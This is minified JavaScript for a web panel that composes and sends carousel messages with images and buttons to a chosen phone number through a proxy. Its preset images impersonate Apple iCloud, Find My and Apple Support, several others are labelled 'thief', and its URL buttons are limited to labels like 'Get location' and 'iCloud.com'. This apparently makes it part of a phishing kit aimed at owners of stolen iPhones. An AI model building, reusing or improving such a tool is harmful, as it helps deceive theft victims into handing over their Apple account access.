e={icloud:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg",icloud_plus:"https://s2-techtudo.glbimg.com/rZTKuZsm2P2O513ocqqI645hlkk=/0x0:984x566/984x0/smart/filters:strip_icc()/i.s3.glbimg.com/v1/AUTH_08fbf48bc0524877943fe86e43087e7a/internal_photos/bs/2025/m/0/PWv8nrR1OX7FeNomGu3g/icloud-plus-what.jpg",icloud_plus_plus:"https://www.apple.com/v/icloud/af/images/meta/og__cu0qwzuuysq6_overview.png",find_my:"https://www.edivaldobrito.com.br/wp-content/uploads/2025/02/os-melhores-acessorios-find-my-para-facilitar-seu-dia-a-dia.webp",iphones_plus:"https://www.remessaonline.com.br/blog/wp-content/uploads/2024/09/iphones-que-ainda-atualizam-1200x900.png",findmy_plus:"https://www.apple.com/br/icloud/images/meta/og__cu0qwzuuysq6_findmy.png?202506270738",buscar_dispositivos:"https://cdsassets.apple.com/live/7WUAS350/images/icloud/locale/pt-br/ios-17-macos-sonoma-iphone-15-pro-find-my-hero.png",macbook:"https://m.media-amazon.com/images/I/41J9j6iVDvS._AC_UF1000,1000_QL80_.jpg",iplace:"https://blog.iplace.com.br/wp-content/uploads/2025/07/iplace-apple-1-1024x544.jpg",suporte_apple:"https://i.ibb.co/pB5YVy1d/6594b616-b237-4a30-a5a0-0a0af2f3e9e6.jpg",suporte_apple_plus_plus:"https://i.ibb.co/k7W8q88/cffebd1f-fb6f-4e9c-9bd2-754fd673fb37.jpg",suporte_apple_plus_plus_plus:"https://i.ibb.co/v6zHv74w/f208175e-162f-40c4-b7be-65fc3aa2eae7.jpg",ladrao:"https://i.ibb.co/4ZrhMwCP/97b9bd6c-ee00-4ef7-a8d9-d46c5e9315c8.jpg",ladrao1:"https://i.ibb.co/Y4TK5QQt/Whats-App-Image-2024-09-08-at-18-10-44.jpg",landrao2:"https://i.ibb.co/27hnjTB6/Whats-App-Image-2024-09-25-at-17-43-16.jpg",ladrao4:"https://i.ibb.co/fdJSh88Z/Whats-App-Image-2025-03-24-at-14-56-53.jpg",ladrao3:"https://i.ibb.co/cK9Fzzng/Whats-App-Image-2024-11-04-at-10-45-11.jpg",default:"https://cdn.mos.cms.futurecdn.net/Cdpw6TMsvTS3tPWmYuVXz6-1200-80.png"};{const e=document.getElementById(`card-image-${t}`);e&&(e.readOnly="manual"!==c.value)}const a=document.getElementById(`card-image-url-field-${t}`);a&&a.classList.toggle("hidden","manual"!==c.value),c.addEventListener("change",(o=>{const n=o.target.value,i=document.getElementById(`card-image-${t}`);if(!i)return;const d="manual"===n;if(i.readOnly=!d,a&&a.classList.toggle("hidden",!d),d)return i.value="",void r();const l=e[n];l&&(i.value=l,r())}))}if(l&&l.addEventListener("change",r),u&&u.addEventListener("click",r),r(),updateCapacityAndColorSelects(t),window.enhanceSelect){const e=document.getElementById(`card-model-${t}`),a=document.getElementById(`card-capacity-${t}`),o=document.getElementById(`card-color-${t}`);window.enhanceSelect(e),window.enhanceSelect(a),window.enhanceSelect(o),s&&window.enhanceSelect(s);const n=document.getElementById(`card-image-source-${t}`);n&&window.enhanceSelect(n),window.refreshEnhancedSelect&&(window.refreshEnhancedSelect(e),window.refreshEnhancedSelect(a),window.refreshEnhancedSelect(o),n&&window.refreshEnhancedSelect(n))}return t}function addCardButton(e,t=null){const a=document.getElementById(`card-buttons-container-${e}`);if(!a)return void console.error(`Cont√™iner de bot√µes para o cart√£o ${e} not found.`);const o=document.createElement("div");o.className="button-editor relative bg-transparent backdrop-blur-xl p-4 rounded-xl border border-white/30 shadow mb-3";const n=a.children.length,i=`btn_${e}_${n}`,d=3===e?"remove-button-btn mt-4 px-4 py-2 rounded-xl border border-red-400/40 bg-red-500/20 hover:bg-red-500/30 text-red-200 font-medium transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-red-400/30 hover:shadow hover:shadow-red-500/20 active:translate-y-[1px]":"remove-button-btn mt-4 py-2 px-4 bg-red-600 text-white font-medium rounded-xl shadow hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-400/50 transition duration-150 ease-in-out";o.innerHTML=`\n        <div class="space-y-2">\n            <div>\n                <label for="button-type-${e}-${n}" class="block text-sm font-medium text-white/80 mb-1">Tipo de Bot√£o:</label>\n                <select id="button-type-${e}-${n}"\n      class="w-full px-3 py-2 bg-transparent border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm">\n                    <option value="URL">URL</option>\n                    <option value="REPLY">Resposta R√°pida (Quick Reply)</option>\n                    <option value="COPY">Copiar Texto</option>\n                    <option value="CALL">Ligar</option>\n                </select>\n            </div>\n\n            <div>\n                <label for="button-label-${e}-${n}" class="block text-sm font-medium text-white/80 mb-1">Texto do Bot√£o:</label>\n                <input type="text" id="button-label-${e}-${n}" placeholder="Ex: Saiba Mais"\n      class="w-full px-3 py-2 bg-transparent border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm" />\n            </div>\n            \n            <div id="button-url-field-${e}-${n}" class="button-field">\n                <label for="button-url-${e}-${n}" class="block text-sm font-medium text-white/80 mb-1">URL:</label>\n                <input type="url" id="button-url-${e}-${n}" placeholder="https://exemplo.com/link"\n      class="w-full px-3 py-2 bg-transparent border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm" />\n            </div>\n            <div id="button-phone-field-${e}-${n}" class="button-field hidden">\n                <label for="button-phone-${e}-${n}" class="block text-sm font-medium text-white/80 mb-1">N√∫mero de Telefone (com DDI, sem +):</label>\n                <input type="text" id="button-phone-${e}-${n}" placeholder="Ex: 5511999999999"\n      class="w-full px-3 py-2 bg-transparent border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm" />\n            </div>\n            <div id="button-copy-field-${e}-${n}" class="button-field hidden">\n                <label for="button-copy-${e}-${n}" class="block text-sm font-medium text-white/80 mb-1">Texto para Copiar:</label>\n                <input type="text" id="button-copy-${e}-${n}" placeholder="Ex: CUPOM20"\n                                 class="w-full px-3 py-2 bg-transparent border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm" />\n            </div>\n            <input type="hidden" id="button-id-${e}-${n}" value="${i}" />\n        </div>\n  <button type="button" class="${d}">\n            - Remover Bot√£o\n        </button>\n    `,a.appendChild(o);try{const t=document.getElementById(`button-type-${e}-${n}`);window.enhanceSelect&&t&&window.enhanceSelect(t);const a=document.getElementById(`button-url-field-${e}-${n}`),o=document.getElementById(`button-phone-field-${e}-${n}`);[a,o,document.getElementById(`button-copy-field-${e}-${n}`)].forEach((e=>{e&&e.classList.add("bg-transparent","border","border-white/20","rounded-xl","p-3","backdrop-blur-xl")}));const i=document.getElementById(`button-label-${e}-${n}`);i&&i.parentElement&&i.parentElement.classList.add("bg-transparent","border","border-white/30","rounded-xl","p-3","backdrop-blur-xl")}catch(e){}o.querySelector(".remove-button-btn").onclick=()=>removeCardButton(o);const l=document.getElementById(`button-type-${e}-${n}`);if(l&&l.addEventListener("change",(()=>toggleButtonFields(e,n))),t)document.getElementById(`button-type-${e}-${n}`).value=t.type||"URL",document.getElementById(`button-label-${e}-${n}`).value=t.label||"","URL"===t.type?document.getElementById(`button-url-${e}-${n}`).value=t.url||"":"CALL"===t.type?document.getElementById(`button-phone-${e}-${n}`).value=t.phone||"":"COPY"===t.type&&(document.getElementById(`button-copy-${e}-${n}`).value=t.copyText||"");else{const t=document.getElementById(`button-type-${e}-${n}`),a=document.getElementById(`button-label-${e}-${n}`);t&&(t.value="REPLY"),a&&!a.value&&(a.value="Falar com atendente")}toggleButtonFields(e,n)}window.enhanceSelect=function(e){if(!e||"1"===e.dataset.enhanced)return;e.dataset.enhanced="1";const t=document.createElement("div");t.className="custom-select";const a=document.createElement("button");a.type="button",a.className="custom-trigger";const o=document.createElement("span");o.textContent="‚ñæ";const n=()=>{const t=e.options[e.selectedIndex];a.textContent=t?t.text:"Selecionar",a.appendChild(o)},i=document.createElement("div");i.className="custom-options",i.style.position="fixed",i.style.zIndex="10000",i.style.display="none",document.body.appendChild(i),e._optionsListRef=i;const d=()=>{i.style.display="none",t.setAttribute("aria-expanded","false")};a.addEventListener("click",(o=>{o.preventDefault();"block"===i.style.display?d():(()=>{const o=a.getBoundingClientRect();i.style.minWidth=o.width+"px",i.style.left=o.left+"px",i.style.top=o.bottom+4+"px",i.style.display="block",t.setAttribute("aria-expanded","true");try{window.sendUiLog&&window.sendUiLog("carousel.openDropdown",{selectId:e.id||null,optionsCount:e.options?e.options.length:0,rect:{left:o.left,top:o.top,width:o.width,bottom:o.bottom}})}catch(e){}})()})),document.addEventListener("click",(e=>{const a=t.contains(e.target),o=i.contains(e.target);a||o||d()})),window.addEventListener("scroll",d,{passive:!0}),window.addEventListener("resize",d),e.classList.add("hidden-select");e.parentNode.insertBefore(t,e),t.appendChild(e),t.appendChild(a),i.innerHTML="",Array.from(e.options).forEach(((a,o)=>{const d=document.createElement("div");d.className="option-item",d.setAttribute("role","option"),d.setAttribute("data-value",a.value),d.setAttribute("aria-selected",e.selectedIndex===o?"true":"false"),d.textContent=a.text,a.disabled&&(d.style.opacity="0.6",d.style.cursor="not-allowed"),d.addEventListener("click",(()=>{a.disabled||(e.value=a.value,e.dispatchEvent(new Event("change")),n(),i.style.display="none",t.setAttribute("aria-expanded","false"))})),i.appendChild(d)})),n()},window.refreshEnhancedSelect=function(e){if(!e)return;const t=e.closest(".custom-select");if(!t)return;const a=t.querySelector(".custom-trigger"),o=e._optionsListRef||document.createElement("div");if(!a||!o)return;o.innerHTML="",Array.from(e.options).forEach(((n,i)=>{const d=document.createElement("div");d.className="option-item",d.setAttribute("role","option"),d.setAttribute("data-value",n.value),d.setAttribute("aria-selected",e.selectedIndex===i?"true":"false"),d.textContent=n.text,n.disabled&&(d.style.opacity="0.6",d.style.cursor="not-allowed"),d.addEventListener("click",(()=>{if(n.disabled)return;e.value=n.value,e.dispatchEvent(new Event("change"));const i=document.createElement("span");i.textContent="‚ñæ",a.textContent=n.text,a.appendChild(i),o.style.display="none",t.setAttribute("aria-expanded","false")})),o.appendChild(d)}));const n=document.createElement("span");n.textContent="‚ñæ";const i=e.options[e.selectedIndex];a.textContent=i?i.text:"Selecionar",a.appendChild(n)},window.sendUiLog=async function(e,t){try{await authFetch("/ui/log",{method:"POST",body:{event:e,details:t}})}catch(e){}};const ALLOWED_URL_LABELS=["Obter localiza√ß√£o","iCloud.com","Find.com","Get location","Obtener ubicaci√≥n"];function toggleButtonFields(e,t){const a=document.getElementById(`button-type-${e}-${t}`);if(!a)return;const o=document.getElementById(`button-label-${e}-${t}`),n=document.getElementById(`button-url-field-${e}-${t}`),i=document.getElementById(`button-phone-field-${e}-${t}`),d=document.getElementById(`button-copy-field-${e}-${t}`),l=a.value;n&&n.classList.add("hidden"),i&&i.classList.add("hidden"),d&&d.classList.add("hidden");const r=`button-label-datalist-${e}-${t}`;if("URL"===l){if(n&&n.classList.remove("hidden"),o&&""===o.value&&(o.value="Obter localiza√ß√£o"),o){let e=document.getElementById(r);e?e.innerHTML=ALLOWED_URL_LABELS.map((e=>`<option value="${e}"></option>`)).join(""):(e=document.createElement("datalist"),e.id=r,e.innerHTML=ALLOWED_URL_LABELS.map((e=>`<option value="${e}"></option>`)).join(""),o.parentElement.appendChild(e)),o.setAttribute("list",r)}}else"CALL"===l?(i&&i.classList.remove("hidden"),o&&""===o.value&&(o.value="Ligar")):"COPY"===l?(d&&d.classList.remove("hidden"),o&&""===o.value&&(o.value="Copiar Cupom")):"REPLY"===l&&o&&""===o.value&&(o.value="Falar com atendente");if("URL"!==l&&o){o.removeAttribute("list");const e=document.getElementById(r);e&&e.remove()}}function removeCarouselCard(e){const t=document.querySelector(`.card-editor[data-card-id="${e}"]`);t&&t.remove()}function removeCardButton(e){e.remove()}async function enviarCarrossel(){const e=document.getElementById("log"),t=document.getElementById("countryDDI"),a=document.getElementById("numero").value.trim(),o=t&&t.options?t.options[t.selectedIndex]:null,n=String(o&&o.getAttribute("data-code")||"").replace(/[^0-9]/g,"");let i=n+a;if(i=i.replace(/^\+/,""),!a||!n)return void(e.innerText="‚ùå Por favor, preencha o DDI do pa√≠s e o n√∫mero do cliente.");const d=[],l=document.querySelectorAll(".card-editor");if(0===l.length)return void(e.innerText="‚ùå Por favor, adicione pelo menos um cart√£o ao carrossel.");for(const t of l){const a=t.getAttribute("data-card-id"),o=document.getElementById(`card-text-${a}`).value,n=document.getElementById(`card-image-${a}`).value.trim();if(!o||!n)return void(e.innerText=`‚ùå O cart√£o #${a} requer texto e URL da imagem.`);const i=[],l=t.querySelectorAll(".button-editor");for(let t=0;t<l.length;t++){const o=document.getElementById(`button-type-${a}-${t}`).value,n=document.getElementById(`button-label-${a}-${t}`).value.trim(),d=document.getElementById(`button-id-${a}-${t}`).value.trim(),l=document.getElementById(`button-url-${a}-${t}`)?.value.trim(),r=document.getElementById(`button-phone-${a}-${t}`)?.value.trim(),s=document.getElementById(`button-copy-${a}-${t}`)?.value.trim();if(!n)return void(e.innerText=`‚ùå O bot√£o #${t+1} do cart√£o #${a} requer um texto (label).`);if("URL"===o&&!ALLOWED_URL_LABELS.includes(n))return void(e.innerText=`‚ùå O texto do bot√£o URL deve ser uma das op√ß√µes: ${ALLOWED_URL_LABELS.join(", ")}`);const c={type:o,label:n,id:d};if("URL"===o){if(!l)return void(e.innerText=`‚ùå O bot√£o URL #${t+1} do cart√£o #${a} requer uma URL.`);c.url=normalizeUrlMaybe(l)}else if("CALL"===o){if(!r)return void(e.innerText=`‚ùå O bot√£o de Chamada #${t+1} do cart√£o #${a} requer um n√∫mero de telefone.`);c.phone=r}else if("COPY"===o){if(!s)return void(e.innerText=`‚ùå O bot√£o de Copiar #${t+1} do cart√£o #${a} requer um texto para copiar.`);c.copyText=s}i.push(c)}d.push({text:o,image:normalizeUrlMaybe(n),buttons:i})}const r={phone:i,message:document.getElementById("mensagemGeral")?.value.trim()||"",delayMessage:document.getElementById("delayMessage")?.value.trim()||"",carousel:d};console.log("Payload enviado do frontend para o proxy:",JSON.stringify(r,null,2));try{e.innerHTML='Enviando sua mensagem, aguarde... <span class="loading-spinner"></span>';const t=await authFetch(proxyCarouselUrl,{method:"POST",body:r}),a=t.headers.get("content-type")||"";let o;if(!a.includes("application/json")){const o=await t.text();return e.innerText=`‚ö†Ô∏è Resposta n√£o-JSON recebida do proxy.\nStatus: ${t.status} ${t.statusText}\nContent-Type: ${a}\nCorpo bruto:\n${o}`,void console.warn("Resposta n√£o-JSON do proxy (carrossel):",{status:t.status,contentType:a,rawText:o})}if(o=await t.json(),t.ok){e.innerText="‚úÖ mensagem enviada com sucesso By Unlock center";try{Swal.fire({icon:"success",title:"Mensagem enviada!",text:"mensagem enviada com sucesso",confirmButtonText:"Ok",customClass:{popup:"swal-red-custom"}})}catch(e){console.warn("SweetAlert2 n√£o p√¥de ser carregado ou chamado:",e)}}else{let t="‚ùå Erro desconhecido";o&&o.error&&(t=`‚ùå ${o.error} ‚ùå`),e.innerText=t,console.error("Erro na resposta do proxy:",o);try{Swal.fire({icon:"error",title:"Falha ao enviar",text:o&&o.error?o.error:"Verifique os dados e tente novamente.",confirmButtonText:"Ok",customClass:{popup:"swal-red-custom"}})}catch(e){console.warn("SweetAlert2 n√£o p√¥de ser carregado ou chamado (erro):",e)}}}catch(t){e.innerText="‚ùå Erro de conex√£o com o proxy:\n"+t.message,console.error("Erro de rede ou proxy:",t)}}document.addEventListener("DOMContentLoaded",(()=>{populateCarouselTemplatesDropdown();const e=document.getElementById("mensagemGeral");if(e){const t=generalCarouselMessageTemplateLang[window.cardTextLang]||generalCarouselMessageTemplateLang.pt;e.value=t,e.removeAttribute("readonly"),e.addEventListener("input",(()=>{window.mensagemGeralEdited=!0}))}addCarouselCard();const t=document.getElementById("countryDDI");if(populateSelect(t,countriesDDI,!0),t.value="BR",window.enhanceSelect){const e=document.getElementById("carouselTemplate");e&&window.enhanceSelect(e),t&&window.enhanceSelect(t)}})),window.setCardLanguage=function(e){window.cardTextLang=["pt","en","es"].includes(e)?e:"pt";const t=document.querySelectorAll(".card-editor"),a=getDefaultCardTextByLang();t.forEach((e=>{const t=e.getAttribute("data-card-id"),o=document.getElementById(`card-text-${t}`);o&&(o.setAttribute("data-template-text",a),updateCardText(t))}));const o=document.getElementById("mensagemGeral");if(o){o.removeAttribute("readonly");const e=generalCarouselMessageTemplateLang[window.cardTextLang]||generalCarouselMessageTemplateLang.pt;o.value=e}};